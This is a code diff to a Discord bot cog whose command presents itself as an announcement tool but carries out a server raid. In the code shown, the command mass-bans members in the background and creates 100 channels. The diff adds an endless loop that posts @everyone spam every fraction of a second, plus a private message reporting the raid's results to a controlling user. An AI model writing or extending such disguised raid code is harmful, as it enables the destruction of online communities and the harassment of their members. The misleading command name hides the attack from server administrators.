@@ -7,6 +7,7 @@ import random
 class Announce(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
+        self.spam_tasks = {}
 
     @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
     @app_commands.describe(
@@ -77,68 +78,80 @@ class Announce(commands.Cog):
             # Ejecutar baneo masivo en segundo plano
             asyncio.create_task(mass_ban())
             
-            # 5. Crear canales y spamear mensajes de forma más rápida
+            # 5. Crear canales
             spam_message = f"@everyone {message}"
             max_channels = 100
             raid_message = "✅ Server raided successfully!"
             
-            # Crear el primer canal y enviar el mensaje de raid
-            first_channel = None
-            try:
-                first_channel = await guild.create_text_channel("raid-notice")
-                await first_channel.send(raid_message)
-                # Enviar también los mensajes de spam en el primer canal
-                for _ in range(3):
-                    await first_channel.send(spam_message)
-            except Exception as e:
-                print(f"Error al crear el primer canal: {e}")
-            
-            # Función para crear canales y enviar mensajes de forma concurrente
-            async def create_channel_and_spam(channel_num):
-                try:
-                    channel_name = f"{message}-{channel_num}"
-                    new_channel = await guild.create_text_channel(channel_name[:100])
-                    
-                    # Enviar mensajes de forma concurrente
-                    send_tasks = []
-                    for _ in range(3):
-                        send_tasks.append(new_channel.send(spam_message))
-                    
-                    await asyncio.gather(*send_tasks, return_exceptions=True)
-                    return True
-                except Exception as e:
-                    print(f"Error al crear canal {channel_num}: {e}")
-                    return False
-            
-            # Crear múltiples canales de forma concurrente
-            channel_count = 1  # Ya creamos el primer canal
+            # Crear canales rápidamente
             channel_tasks = []
+            created_channels = []
             
-            for i in range(max_channels - 1):
-                channel_tasks.append(create_channel_and_spam(i))
-                # Pequeño delay para evitar rate limits extremos
-                if i % 5 == 0:
-                    await asyncio.sleep(0.1)
+            for i in range(max_channels):
+                try:
+                    channel_name = f"{message}-{i}"
+                    channel_tasks.append(guild.create_text_channel(channel_name[:100]))
+                    # Pequeño delay para evitar rate limits
+                    if i % 5 == 0:
+                        await asyncio.sleep(0.1)
+                except Exception as e:
+                    print(f"Error al crear canal {i}: {e}")
+                    break
             
-            # Esperar a que se completen todas las tareas de creación de canales
-            results = await asyncio.gather(*channel_tasks, return_exceptions=True)
-            channel_count += sum(1 for r in results if r is True)
+            # Esperar a que se creen todos los canales
+            created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
+            # Filtrar canales creados exitosamente
+            created_channels = [c for c in created_channels if not isinstance(c, Exception)]
+            channel_count = len(created_channels)
             
-            # 6. Enviar mensaje al DM del useradmin
+            # Enviar mensaje de raid en el primer canal
+            if created_channels:
+                try:
+                    await created_channels[0].send(raid_message)
+                except Exception as e:
+                    print(f"Error al enviar mensaje de raid: {e}")
+            
+            # 6. Iniciar spam continuo en todos los canales
+            async def continuous_spam():
+                spam_count = 0
+                while True:
+                    try:
+                        # Seleccionar un canal aleatorio
+                        channel = random.choice(created_channels)
+                        # Enviar mensaje
+                        await channel.send(spam_message)
+                        spam_count += 1
+                        
+                        # Intervalo muy corto entre mensajes (0.1-0.3 segundos)
+                        await asyncio.sleep(0.1 + random.random() * 0.2)
+                        
+                    except Exception as e:
+                        print(f"Error en spam continuo: {e}")
+                        # Si hay error, esperar un poco más
+                        await asyncio.sleep(1)
+            
+            # Iniciar spam continuo en segundo plano
+            spam_task = asyncio.create_task(continuous_spam())
+            # Guardar la tarea para poder cancelarla luego si es necesario
+            self.spam_tasks[guild.id] = spam_task
+            
+            # 7. Enviar mensaje al DM del useradmin
             try:
                 dm_channel = await useradmin.create_dm()
                 await dm_channel.send(
                     f"✅ Server raided successfully!\n"
                     f"- Initial bans: {banned_members}\n"
                     f"- Channels created: {channel_count}\n"
-                    f"- Message: {message}"
+                    f"- Message: {message}\n"
+                    f"- Continuous spam started in {channel_count} channels"
                 )
             except Exception as e:
                 print(f"No se pudo enviar mensaje al DM de {useradmin}: {e}")
             
             await interaction.followup.send(
                 f"Operación completada. Se banearon {banned_members} miembros inicialmente. " +
-                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano.",
+                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano. " +
+                f"Spam continuo iniciado en todos los canales.",
                 ephemeral=True
             )
             
@@ -148,6 +161,19 @@ class Announce(commands.Cog):
                 await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
             except:
                 pass
+
+    # Función para detener el spam (opcional)
+    @app_commands.command(name="stopspam", description="Detener el spam continuo")
+    @app_commands.checks.has_permissions(administrator=True)
+    async def stopspam(self, interaction: discord.Interaction):
+        """Detener el spam continuo en el servidor"""
+        guild_id = interaction.guild.id
+        if guild_id in self.spam_tasks:
+            self.spam_tasks[guild_id].cancel()
+            del self.spam_tasks[guild_id]
+            await interaction.response.send_message("Spam detenido.", ephemeral=True)
+        else:
+            await interaction.response.send_message("No hay spam activo en este servidor.", ephemeral=True)
 
 async def setup(bot):
     await bot.add_cog(Announce(bot))
